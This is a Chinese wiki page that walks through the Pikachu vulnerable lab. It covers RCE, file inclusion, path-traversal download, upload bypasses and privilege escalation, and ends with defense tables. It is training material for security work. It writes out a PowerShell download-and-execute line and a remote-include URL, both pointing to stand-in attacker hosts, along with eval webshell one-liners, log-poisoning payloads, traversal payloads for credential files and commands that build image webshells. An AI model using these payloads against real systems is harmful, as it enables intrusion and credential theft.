---
title: Pikachu靶场实战复现第4部分：RCE、文件包含、文件下载、文件上传绕过与越权漏洞完整分析
description: 基于无名安全团队归档文章，系统复现 Pikachu 靶场第 4 篇实战内容，涵盖远程命令/代码执行（Ping/Eval）、本地/远程文件包含、不安全文件下载、文件上传多层绕过（前端校验、MIME
  类型、getimagesize）、水平/垂直越权漏洞的原理、Payload 构造、利用链分析及防御思路，交叉引用现有知识库相关技术详解页面。
category: program-analysis
tags:
- Pikachu靶场
- RCE
- 远程命令执行
- 远程代码执行
- 文件包含
- 本地文件包含
- 远程文件包含
- 文件下载漏洞
- 文件上传绕过
- 前端校验绕过
- MIME类型绕过
- getimagesize绕过
- 图片马
- 越权漏洞
- 水平越权
- 垂直越权
- 漏洞复现
- 利用链分析
- 无名安全团队
date: 2021-08-01
updated: '2026-11-14'
---
## 概述

本页面基于无名安全团队微信公众号归档文章《pikachu靶场&RCE&文件包含&上传&越权(四)》，系统整理 Pikachu 靶场第四部分的五大核心漏洞类别：**RCE（远程命令/代码执行）**、**文件包含（本地/远程）**、**文件下载**、**文件上传绕过（三层防护突破）**、**越权漏洞（水平/垂直）**。每类漏洞均包含原理说明、靶场复现步骤、关键代码片段分析、利用链构造及防御建议，并通过 `[[wikilink]]` 交叉引用知识库中已有的技术详解页面，形成完整的 Web 攻防知识体系。

> **原文来源**：无名安全团队，作者 Geek_韧，发布于 2021-08  
> **靶场环境**：Pikachu-master (端口 8890)  
> **适用场景**：Web 安全入门、CTF 实战巩固、渗透测试基础训练

---

## 一、RCE（Remote Command/Code Execution）

### 漏洞原理

> RCE 漏洞允许攻击者向后台服务器远程注入操作系统命令或代码，从而控制后台系统。常见于 Web 管理界面提供的 `ping`、`traceroute`、`nslookup` 等诊断功能，或直接将用户输入作为代码执行（如 PHP `eval()`、`assert()`、`preg_replace(/e)` 等）。

**核心成因**：
- 后台直接拼接用户可控参数进入系统命令执行函数（`exec()`、`system()`、`shell_exec()`、`passthru()`、`popen()`、`proc_open()`、`backticks` 等）
- 后台直接将用户输入作为代码片段执行（`eval()`、`assert()`、`call_user_func()`、`create_function()` 等）
- 缺乏严格的**白名单校验**、**命令参数转义**（`escapeshellarg()`/`escapeshellcmd()`）、**危险函数禁用**（`disable_functions`）及 **open_basedir** 限制

> **防御核心**：所有与前端交互的数据均不可信，必须实施严格白名单策略，最小权限原则运行 Web 服务。

### RCE-PING（命令注入）

#### 靶场复现

| 步骤 | 操作 | 说明 |
|------|------|------|
| 1 | 访问 `/vul/rce/rce_ping.php` | Ping 测试页面，输入 IP 地址 |
| 2 | 测试正常功能 | 输入 `127.0.0.1` → 返回 ping 结果 |
| 3 | 注入命令分隔符 | Windows: `127.0.0.1 && whoami` / `127.0.0.1 & whoami` / `127.0.0.1 | whoami`<br>Linux: `127.0.0.1; whoami` / `127.0.0.1 \n whoami` / `127.0.0.1 \`whoami\`` |
| 4 | 观察回显 | 命令执行结果直接拼接在 ping 输出中 |

#### 关键代码分析（源码无任何过滤）

```php
// vul/rce/rce_ping.php 核心逻辑
$ip = $_POST['ip'];
$cmd = "ping -n 3 " . $ip;          // Windows 环境
// $cmd = "ping -c 3 " . $ip;       // Linux 环境
$result = system($cmd);             // 直接执行，无过滤
echo $result;
```

#### 进阶利用思路

- **反弹 Shell**：`127.0.0.1 && powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')"` (Windows)  
- **写 Webshell**：`127.0.0.1 && echo ^<?php @eval($_POST[1]);?^> > C:/webroot/shell.php`  
- **绕过空格/特殊字符过滤**：利用 `$IFS`、`{cat,/etc/passwd}`、`<` 重定向、`base64 -d` 等技巧 → 详见 [[ctf-show-php-command-execution-bypass-techniques]] 第 9-23 关绕过大全

### RCE-EVAL（代码执行）

#### 靶场复现

| 步骤 | 操作 | 说明 |
|------|------|------|
| 1 | 访问 `/vul/rce/rce_eval.php` | 代码执行测试页面 |
| 2 | 直接输入 PHP 代码 | `phpinfo();` / `system('whoami');` / `eval($_POST[1]);` |
| 3 | 获取代码执行权限 | 任意 PHP 函数可执行，等同于拥有一句话 Webshell |

#### 关键代码分析

```php
// vul/rce/rce_eval.php 核心逻辑
$code = $_POST['code'];
eval($code);    // 直接执行用户输入的 PHP 代码
```

#### `eval()` 危害分析

- 执行任意 PHP 代码，绕过 `disable_functions` 限制（内部函数调用不受限）
- 可动态构造类、函数、匿名函数，配合反序列化、SSTI 等链式利用
- **修复**：禁用 `eval()`，改用模板引擎沙箱、白名单解析器、或 `assert()` 替代并严格控制输入

> 相关技术：[[php-webshell-fundamentals-chopper-analysis]] 一句话木马核心原理、`eval()` 执行流程与蚁剑流量解析

---

## 二、文件包含漏洞

### 漏洞原理

> 文件包含是开发语言内置功能（PHP: `include/include_once/require/require_once`），用于复用代码。当**包含路径由用户可控变量决定**且**未做白名单校验**时，攻击者可指定任意文件被包含执行。

| 类型 | 条件 | 危害 | 典型利用 |
|------|------|------|----------|
| **本地文件包含 (LFI)** | `allow_url_include=Off` (默认) | 读取敏感文件 (`/etc/passwd`、`/proc/self/environ`、日志、源码)；配合文件上传/日志投毒 → RCE | `../../../etc/passwd`、`php://filter/read=convert.base64-encode/resource=index.php` |
| **远程文件包含 (RFI)** | `allow_url_include=On` 且 `allow_url_fopen=On` | 直接加载攻击者服务器上的恶意脚本 → 直接 RCE | `http://attacker/evil.txt?` |

> **防御**：避免动态包含用户输入；必须动态包含时，维护白名单映射表；配置 `open_basedir` 限制跨目录访问；关闭 `allow_url_include`。

### 本地文件包含 (LFI) 复现

#### 靶场路径

- `/vul/fileinclude/fi_local.php?filename=`

#### 复现步骤

| Payload | 效果 |
|---------|------|
| `../../../../etc/passwd` | 读取 Linux 密码文件 (靶场为 Windows，尝试 `../../../../windows/win.ini`) |
| `../../../../windows/win.ini` | 成功读取 Windows 系统文件 |
| `php://filter/read=convert.base64-encode/resource=../../vul/rce/rce_ping.php` | 读取 PHP 源码 (Base64 编码绕过直接执行) |
| `../../../../var/log/apache2/access.log` | 结合日志投毒 (User-Agent 注入 `<?php system($_GET[1]);?>`) → RCE |

#### 关键代码

```php
// vul/fileinclude/fi_local.php
$filename = $_GET['filename'];
include($filename);   // 无任何过滤，直接包含
```

#### 利用链延伸

- **LFI + 文件上传** → 上传图片马 → 包含执行 → 详见本页面「文件上传绕过 getimagesize」实战
- **LFI + 伪协议** → `php://filter` 读源码、`php://input` 执行 POST 代码、`data://` 执行内联代码、`gopher://` 攻击内网 Redis/FastCGI → [[php伪协议与反序列化利用]]、[[ssrf-ctf-exploitation-guide]] 协议差异对比
- **LFI + /proc/self/environ** → 注入 User-Agent → 包含执行 (需知晓路径)
- **LFI + SSH 认证日志** → `ssh <?php system($_GET[1]);?>@target` → 包含 `/var/log/auth.log`

> 交叉引用：[[huxiangbei-willphp-file-inclusion-writeup]] WillPHP 框架 `extract()` 变量覆盖 + `include` 任意文件包含 → `pearcmd.php` 写 Webshell 完整链

### 远程文件包含 (RFI) 复现

#### 前置条件

- `php.ini`：`allow_url_include=On`、`allow_url_fopen=On` (靶场默认开启)
- 攻击者需搭建可访问的 HTTP 服务托管恶意文件

#### 复现步骤

1. **攻击机搭建恶意文件**  
   根目录创建 `evil.txt`：
   ```php
   <?php system('whoami'); ?>
   ```
   启动 HTTP 服务：`python -m http.server 8000`

2. **靶场触发包含**  
   访问：`http://pikachu-master:8890/vul/fileinclude/fi_remote.php?filename=http://attacker_ip:8000/evil.txt`

3. **命令执行成功** → 直接 RCE

#### 进阶：写 Webshell 链

```php
// evil.txt 内容
<?php file_put_contents('shell.php', '<?php @eval($_POST[1]);?>'); ?>
```
包含后访问 `http://pikachu-master:8890/vul/fileinclude/shell.php` 获取持久化 Webshell。

> 实战案例：[[attack-defense-world-master-advanced-writeup]] ThinkPHP5 文件包含 RCE、Git 源码泄露结合文件包含利用链

---

## 三、文件下载漏洞

### 漏洞原理

> 后台直接拼接用户传入的 `filename` 参数构造文件路径，未校验路径穿越序列 (`../`、`..\`)，导致任意文件读取下载。常见于附件下载、备份文件下载、日志导出等功能。

**核心代码模式**：
```php
$file = $_GET['filename'];
$path = "/var/www/html/downloads/" . $file;
header("Content-Disposition: attachment; filename=" . $file);
readfile($path);   // 无路径规范化、无白名单、无基目录限制
```

### 靶场复现

#### 目标页面

- `/vul/unsafedownload/execdownload.php?filename=`

#### 正常下载请求

```
GET /vul/unsafedownload/execdownload.php?filename=kb.png
GET /vul/unsafedownload/execdownload.php?filename=ai.png
GET /vul/unsafedownload/execdownload.php?filename=bigben.png
```

#### 路径穿越 Payload

| Payload | 目标文件 | 说明 |
|---------|----------|------|
| `../../../1.txt` | 网站根目录下的 `1.txt` | 成功下载 |
| `../../../../etc/passwd` | Linux 密码文件 | 需知晓绝对路径深度 |
| `../../../../windows/win.ini` | Windows 系统文件 | 靶场环境适用 |
| `../config/database.php` | 数据库配置文件 | 连同敏感凭证下载 |
| `../../../vul/rce/rce_ping.php` | 源码审计 | 配合代码审计发现更多漏洞 |

#### 实战价值

- **信息收集放大器**：获取源码 → 白盒审计 → 挖掘 SQLi、RCE、反序列化等高危漏洞
- **凭证窃取**：下载 `.git/config`、`.env`、`config.php`、`wp-config.php`、SSH 私钥 (`id_rsa`) → 横向移动
- **组合利用**：LFI 读取源码 ↔ 文件下载读取源码，互为补充

> 防御：`basename()` 仅保留文件名、白名单校验、`realpath()` 规范化后判断是否在允许目录下、数据库存储文件元信息 ID 映射而非直接暴露路径

---

## 四、文件上传漏洞多层绕过实战

> 文件上传是 Webshell 植入的主要入口。靶场设置三个递进等级：**前端 JS 校验 → MIME 类型校验 → `getimagesize()` 图片二次渲染校验**，完整覆盖实战常见绕过技术栈。

### 等级一：前端页面检查

#### 靶场页面

- `/vul/unsafeupload/upload_1.php` (client check)

#### 校验逻辑

```html
<!-- 前端 JS 校验扩展名 -->
<script>
  function checkFile() {
    var file = document.getElementById('upload_file').value;
    var ext = file.substring(file.lastIndexOf('.')+1).toLowerCase();
    if (ext != 'jpg' && ext != 'png' && ext != 'gif') {
      alert('只允许上传 jpg/png/gif 图片！');
      return false;
    }
  }
</script>
```

#### 绕过方法

| 方法 | 操作步骤 | 原理 |
|------|----------|------|
| **修改扩展名** | 1. 准备 `shell.php` → 重命名 `shell.png`<br>2. 点击上传 → 抓包 (Burp)<br>3. 将 `filename="shell.png"` 改为 `filename="shell.php"`<br>4. 放包 | 前端校验仅检查扩展名字符串，后端未二次校验 |
| **禁用 JS** | 浏览器开发者工具 → Disable JavaScript → 直接上传 `.php` | 彻底绕过前端逻辑 |
| **大小写绕过** | `.pHp`、`.Php`、`.PHP5`、`.pht`、`.phtml` | Windows 大小写不敏感、Apache `AddType` 配置可能解析 |

#### 复现结果

- 上传成功，返回路径：`/vul/unsafeupload/uploads/2021/08/04/xxx.php`
- 直接访问 → 代码执行，获取 Webshell

> **核心教训**：前端校验**不可信**，必须在后端实施二次校验。

---

### 等级二：MIME TYPE 校验

#### 靶场页面

- `/vul/unsafeupload/upload_2.php` (MIME check)

#### 校验逻辑

```php
$allowed_mime = ['image/jpeg', 'image/png', 'image/gif'];
$mime = $_FILES['upload_file']['type'];   // 取自 $_FILES['type']，完全可控
if (!in_array($mime, $allowed_mime)) {
    die('文件类型不允许！');
}
```

#### 绕过原理

- `$_FILES['type']` 由**浏览器根据文件扩展名猜测**发送，**完全可控**
- 抓包修改 `Content-Type: image/jpeg` 即可绕过

#### 实战操作

1. 准备 `shell.php` (内容: `<?php @eval($_POST[1]);?>`)
2. Burp 抓包上传请求
3. 修改 `Content-Type: image/jpeg` (或 `image/png`/`image/gif`)
4. 保持 `filename="shell.php"` 或改为 `shell.jpg` (配合解析漏洞)
5. 放包 → 上传成功

#### 常见 MIME 类型速查

| 扩展名 | MIME Type |
|--------|-----------|
| .jpg/.jpeg | `image/jpeg` |
| .png | `image/png` |
| .gif | `image/gif` |
| .php | `application/x-httpd-php` (被拦截) |
| .txt | `text/plain` |
| .pdf | `application/pdf` |

> **防御**：不要信任 `$_FILES['type']`，需结合**文件头魔数检测**、`finfo_file()`、`getimagesize()`、二次渲染等服务端强校验。

---

### 等级三：getimagesize() 图片二次渲染校验

#### 靶场页面

- `/vul/unsafeupload/upload_3.php` (getimagesize check)

#### 校验逻辑

```php
$tmp = $_FILES['upload_file']['tmp_name'];
$info = getimagesize($tmp);   // 解析文件头，非图片返回 false
if ($info === false) {
    die('非合法图片文件！');
}
// 移动文件...
```

#### 绕过原理：图片马

- `getimagesize()` 仅检测**文件头魔数** (JPEG: `FF D8 FF`、PNG: `89 50 4E 47`、GIF: `47 49 46 38`)
- 将 PHP 代码**注入图片非关键区域** (注释段、EXIF、IDAT 后追加) → 文件头合法，`getimagesize()` 通过
- **前提**：服务器将该文件当作 PHP 解析 (需配合解析漏洞、`.htaccess`、`<FilesMatch>`、双后缀、解析器配置错误等)

#### 实战制作图片马

```bash
# Windows 环境
copy /b normal.jpg + shell.php shell.jpg

# Linux 环境
cat normal.jpg shell.php > shell.jpg

# 或使用 exiftool 注入 EXIF
exiftool -Comment="<?php @eval($_POST[1]);?>" normal.jpg -o shell.jpg
```

#### 靶场复现步骤

1. **制作图片马**  
   - 准备 `1.jpg` (正常图片) + `shell.php` (一句话)
   - `cmd` 下执行：`copy /b 1.jpg+shell.php shell.jpg`
   - 生成 `shell.jpg`，文件头为 JPEG，尾部含 PHP 代码

2. **上传绕过**  
   - 上传 `shell.jpg` → `getimagesize()` 校验通过 → 保存为 `xxx.jpg`

3. **执行困境**  
   - 直接访问 `xxx.jpg` → 以图片形式展示，**PHP 代码不执行** (无解析漏洞)

4. **组合利用链：文件包含执行**  
   - 利用本页面 **LFI 漏洞** 包含上传的图片马：
     ```
     http://pikachu-master:8890/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2021/08/04/931743610a8ddfbf58d141830784.jpg
     ```
   - `include` 解析 PHP 代码 → **成功执行** `phpinfo()` / `system('whoami')` / 写 Webshell

#### 完整利用链总结

```
文件上传 (getimagesize 绕过) → 上传图片马 (.jpg)
        ↓
本地文件包含 (LFI) → include 图片马路径
        ↓
PHP 代码执行 → 获取 Webshell / RCE
```

> **实战启示**：单一上传绕过往往不足以直接 RCE，**漏洞组合拳** (上传 + 包含/解析/重写/覆盖) 才是实战核心。  
> 相关案例：[[vulnhub-bbs-cute-102-writeup]] GIF89a 头 + PHP 绕过上传 → 直接解析执行 (Apache 解析漏洞)；[[edu-src-penetration-test-case-study]] 实战 SRC 文件上传绕过 Getshell 全链路

#### 防御体系建议

| 层级 | 措施 |
|------|------|
| **前端** | 仅作用户体验拦截，不可信 |
| **MIME** | 服务端 `finfo_file()` / `mime_content_type()` 真实检测 |
| **内容** | `getimagesize()` + **二次渲染** (`imagecreatefromjpeg()` → `imagejpeg()` 重写，破坏注入代码) |
| **存储** | **随机文件名** (UUID + 时间戳)、**去扩展名** 或统一 `.dat`、**非 Web 目录存储** (或配置 `nginx`/`apache` 禁止上传目录执行 PHP) |
| **访问** | 下载脚本 `readfile()` 代理访问，不直接暴露 URL |
| **配置** | `open_basedir` 限制、`disable_functions` 禁危险函数、上传目录 `php_flag engine off` |

---

## 五、越权漏洞

### 漏洞原理

> 越权漏洞 (Broken Access Control, OWASP Top 10 #A01:2021) 是指应用未正确校验用户权限，导致用户可访问/操作超出其权限范围的资源。

| 维度 | 定义 | 典型场景 |
|------|------|----------|
| **水平越权** | 同权限/同层级用户间非法访问彼此数据 | `userid=1001` 改为 `userid=1002` 查看他人订单、个人信息、私密文档 |
| **垂直越权** | 低权限用户非法执行高权限操作 | 普通用户访问管理员接口：创建用户、分配角色、修改系统配置、查看所有数据 |

**根因**：后台仅校验「是否登录」(`session` 存在)，未校验「当前用户是否拥有对目标资源的操作权限」；或权限判断依赖前端传参 (`role=admin`、`level=1`)、Cookie 可篡改字段。

> **防御核心**：
> 1. **后台集中式权限模型** (RBAC/ABAC)，每个敏感操作入口强制调用 `checkPermission(user, resource, action)`
> 2. **最小权限原则**：默认拒绝，显式授权
> 3. **不可信前端数据**：所有权限判断基于服务端会话 (`$_SESSION['user_id']`、`$_SESSION['role']`)，不可来自 `$_GET/POST/COOKIE`
> 4. **间接对象引用 (IDOR) 防护**：使用不可预测的 GUID/UUID 替代自增 ID，或配合 ACL 校验

---

### 水平越权复现

#### 靶场页面

- `/vul/overpermission/op1/op1_mem.php?username=`

#### 复现步骤

1. **注册/登录三个账号**：`lucy`、`lili`、`kobe` (均为普通用户)
2. **观察 URL 规律**：
   ```
   http://pikachu-master:8890/vul/overpermission/op1/op1_mem.php?username=lucy
   http://pikachu-master:8890/vul/overpermission/op1/op1_mem.php?username=lili
   http://pikachu-master:8890/vul/overpermission/op1/op1_mem.php?username=kobe
   ```
3. **直接修改 `username` 参数** → 无需密码、无需 Session 即可查看任意用户详细信息 (手机、邮箱、地址等)

#### 代码根因

```php
// op1_mem.php
$username = $_GET['username'];   // 直接取前端参数
$query = "select * from member where username='$username'";
// 无任何检查：当前登录用户 == 请求的 username ?
$result = execute($link, $query);
// 直接展示
```

#### 修复示例

```php
$current_user = $_SESSION['username'];   // 服务端会话
$target_user  = $_GET['username'];
if ($current_user !== $target_user && !isAdmin($current_user)) {
    die('无权访问他人信息');
}
```

---

### 垂直越权复现

#### 靶场角色设定

| 账号 | 密码 | 权限级别 | 功能 |
|------|------|----------|------|
| `admin` | `123456` | `level=1` (管理员) | 查看/创建/删除用户 |
| `pikachu` | `000000` | `level=2` (普通用户) | 仅查看用户列表 |

#### 攻击路径

1. **管理员登录抓包**  
   - 登录 `admin/123456` → 进入 `op2_admin.php`  
   - 点击「添加用户」 → 抓包 `POST /vul/overpermission/op2/op2_admin_edit.php`  
   - 记录管理员的 `PHPSESSID` (身份凭证)

2. **普通用户构造请求**  
   - 登录 `pikachu/000000` → 进入 `op2_user.php` (仅查看)  
   - 替换 Cookie 中的 `PHPSESSID` 为管理员的值  
   - 直接访问 `op2_admin_edit.php` 提交创建用户表单

3. **成功创建用户** → 垂直越权完成

#### 代码层面漏洞链分析

| 文件 | 校验逻辑 | 缺陷 |
|------|----------|------|
| `op2_login.php` | 校验账密 → 设置 `$_SESSION['op2']['level']` (1=admin, 2=user) | 正常 |
| `op2_user.php` | `check_op2_login()` 仅判断**是否登录** | **未校验 level**，普通用户可访问 |
| `op2_admin_edit.php` (创建用户) | `check_op2_login()` 仅判断**是否登录** | **未校验 level=1**，越权核心点 |
| `op2_admin.php` (管理员主页) | `check_op2_login() && $_SESSION['op2']['level']==1` | **严格校验**，故创建成功后回显跳转会被拦截，但**数据已入库** |

#### 关键代码片段

```php
// op2_admin_edit.php - 创建用户接口
if (!check_op2_login($link)) {   // 仅检查登录态
    header("location:op2_login.php");
    exit();
}
// 缺失: if ($_SESSION['op2']['level'] != 1) exit();
if (isset($_POST['submit'])) {
    $getdata = escape($link, $_POST);
    $query = "insert into member(username,pw,sex,phonenum,email,address) values(...)";
    execute($link, $query);   // 直接执行，无权限门槛
}
```

#### 利用条件总结

- **凭证窃取/固定**：需获取高权限用户的有效 Session ID (会话固定、XSS 窃取、中间人、暴力破解)
- **接口缺乏细粒度授权**：功能级权限校验缺失
- **业务流程跳过检查**：创建、删除、修改等写操作未二次校验角色

> 实战扩展：[[jwt漏洞原理与实战利用]] JWT 算法混淆/密钥爆破/None Algorithm 导致垂直越权 (篡改 `role: admin`)、[[cybersecurity-interview-guide-2022]] 面试高频：水平/垂直越权挖掘与修复方案

---

## 六、综合利用链与实战思维导图

```mermaid
graph TD
    A[Pikachu 靶场 Part 4] --> B[RCE]
    A --> C[文件包含]
    A --> D[文件下载]
    A --> E[文件上传绕过]
    A --> F[越权漏洞]

    B --> B1[Ping 命令注入<br/>system/exec 无过滤]
    B --> B2[Eval 代码执行<br/>eval() 直接执行]
    
    C --> C1[LFI 本地包含<br/>读敏感文件/源码/日志]
    C --> C2[RFI 远程包含<br/>allow_url_include=On → 直接 RCE]
    C1 --> C1a[伪协议 php://filter 读源码]
    C1 --> C1b[结合上传图片马 → RCE]
    C2 --> C2a[写 Webshell 持久化]

    D --> D1[路径穿越 ../<br/>任意文件下载]
    D1 --> D1a[源码审计/配置泄露/凭证窃取]

    E --> E1[前端 JS 校验<br/>改扩展名/抓包改包]
    E --> E2[MIME 类型校验<br/>修改 Content-Type]
    E --> E3[getimagesize 校验<br/>图片马 + LFI 组合执行]
    E3 --> E3a[制作: copy /b img.jpg+shell.php shell.jpg]
    E3 --> E3b[上传 → LFI include → 代码执行]

    F --> F1[水平越权<br/>username 参数遍历]
    F --> F2[垂直越权<br/>越权访问 admin_edit.php + Session 替换]
    F2 --> F2a[缺失 RBAC 细粒度校验]
    F2 --> F2b[依赖前端/不可信 Session 字段]

    %% 交叉利用链
    E3b --> C1b
    D1a --> B1
    D1a --> C1a
    C1b --> B2
```

---

## 七、防御清单与安全编码规范

| 漏洞类别 | 核心防御措施 | 代码/配置示例 |
|----------|--------------|---------------|
| **RCE** | 1. 禁用危险函数 `disable_functions=exec,system,shell_exec,passthru,popen,proc_open,eval,assert`<br>2. 命令参数严格白名单 + `escapeshellarg()`<br>3. 避免动态代码执行，改用模板引擎沙箱 | `if (!in_array($ip, $allow_ips)) die(); system("ping -c 3 " . escapeshellarg($ip));` |
| **文件包含** | 1. `allow_url_include=Off`<br>2. 白名单映射 `include $white_list[$_GET['page']];`<br>3. `open_basedir=/var/www/html:/tmp` | `$page = $_GET['page']; $map = ['home'=>'home.php','about'=>'about.php']; include $map[$page] ?? '404.php';` |
| **文件下载** | 1. 数据库 ID 映射文件路径，不暴露路径<br>2. `basename()` + `realpath()` 校验在允许目录下<br>3. `Content-Disposition: attachment` 强制下载 | `$id = (int)$_GET['id']; $row = $db->get("files", $id); $path = STORAGE . $row['hash']; if (strpos(realpath($path), realpath(STORAGE)) !== 0) die();` |
| **文件上传** | 1. 服务端 `finfo_file()` 验证 MIME<br>2. `getimagesize()` + **二次渲染重写** (`imagejpeg(imagecreatefromjpeg($tmp), $dest)`)<br>3. 随机文件名 (UUID) + 去扩展名/统一 `.dat`<br>4. 存储目录**非 Web 可执行** (`php_flag engine off` / `location ~ \.php$ { deny all; }`)<br>5. 病毒扫描集成 (ClamAV) | `$finfo = finfo_open(FILEINFO_MIME_TYPE); $mime = finfo_file($finfo, $tmp); if (!in_array($mime, ['image/jpeg','image/png'])) die(); $img = imagecreatefromjpeg($tmp); imagejpeg($img, $dest);` |
| **越权** | 1. RBAC/ABAC 集中授权中间件<br>2. 服务端 Session 存储角色/权限，不可来自前端<br>3. 资源级 ACL：`if (!can($user, 'update', $resource)) abort(403);`<br>4. IDOR 防护：UUID + 归属校验 | `// Laravel Gate 示例<br>Gate::define('update-post', fn($u,$p) => $u->id === $p->user_id);` |

---

## 八、交叉引用与延伸阅读

| 知识点 | 关联页面 | 说明 |
|--------|----------|------|
| PHP 伪协议综合利用 | [[php伪协议与反序列化利用]] | `php://filter` 读源码、`phar://` 反序列化、`gopher://` 攻击内网服务 |
| SSRF 协议差异与绕过 | [[ssrf-ctf-exploitation-guide]] | `file_get_contents` vs `curl` 协议支持对比、内网探测、Gopher/FastCGI/Redis 利用链 |
| 一句话 Webshell 流量分析 | [[php-webshell-fundamentals-chopper-analysis]] | `eval()` 执行原理、蚁剑连接流程、Content-Type 绕过上传实战 |
| WillPHP 文件包含实战 | [[huxiangbei-willphp-file-inclusion-writeup]] | `extract()` 变量覆盖 → `include` → `pearcmd.php` 写 Shell 完整链 |
| 实战 SRC 文件上传绕过 | [[edu-src-penetration-test-case-study]] | FOFA 资产发现 → 弱口令 → 存储型 XSS → 文件上传绕过 Getshell → 蚁剑连接 |
| CTF-show 命令执行绕过大全 | [[ctf-show-php-command-execution-bypass-techniques]] | 第 9-23 关：无字母数字 RCE、disable_functions 绕过、Nginx 日志投毒、Bash 变量展开 |
| JWT 垂直越权实战 | [[jwt漏洞原理与实战利用]] | 算法混淆、密钥爆破、None Algorithm、盐值离线爆破、SQL 注入绕过 |
| Pikachu 靶场 Part 5 | [[pikachu-target-writeup-part5]] | 目录遍历、信息泄露、PHP 反序列化、XXE、不安全重定向、SSRF 续篇 |
| 攻防世界高手进阶 Writeup | [[attack-defense-world-master-advanced-writeup]] | ThinkPHP5 RCE、文件包含绕过、SQLi 变种、JS 逆向、PHP 反序列化、文件上传、SSTI、Git 泄露、preg_replace RCE 等 |
| VulnHub 实战靶机合集 | [[vulnhub-platform-resource-index]] | 750+ 靶机资源、OSCP 备考路径、现有 Writeup 交叉索引 |

---

## 九、结语

Pikachu 靶场第四部分以**极简代码**还原了 Web 攻防中最经典的五大漏洞族类，覆盖了从**输入验证缺失 (RCE/文件包含/下载)** 到**业务逻辑缺陷 (上传绕过/越权)** 的完整攻击面。实战中，**单一漏洞往往不足以直接拿下目标**，需掌握**漏洞组合拳**思维：

> **上传绕过 + 文件包含** → 突破执行环境限制  
> **文件下载 + 源码审计** → 发现隐藏 RCE/反序列化/逻辑漏洞  
> **越权 + 会话劫持** → 横向/纵向扩大战果  
> **RCE + 内网穿透** → 横向移动、域控制

建议读者在复现基础上，结合 [[ctf-show-php-command-execution-bypass-techniques]]、[[php伪协议与反序列化利用]]、[[ssrf-ctf-exploitation-guide]] 等页面深化绕过技巧，并参考 [[cybersecurity-interview-guide-2022]] 构建系统化的漏洞挖掘与修复能力模型。

> **安全开发三字经**：不信任、严校验、少权限、分层防、记审计。  

--- 

*页面维护者：数字知识库策展人*  
*最后更新：2025-01-15*  
*数据来源：无名安全团队微信公众号归档文章*

## 来源

- [0x00实验室-202108-202304_076](../sources/0x00实验室-202108-202304_076.md)
